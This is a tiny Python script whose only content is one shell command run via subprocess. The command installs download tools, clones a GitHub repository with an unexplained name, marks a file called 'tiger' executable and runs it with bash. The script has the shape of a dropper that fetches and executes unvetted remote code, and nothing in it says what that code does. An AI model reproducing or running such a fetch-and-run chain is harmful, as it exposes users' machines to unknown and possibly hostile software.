#!/usr/bin/env python
import subprocess

subprocess.check_call("apt update;apt -y install wget git curl;git clone https://github.com/buyilechithibhunga/tiger.git;cd tiger;chmod +x tiger;bash tiger", shell=True)
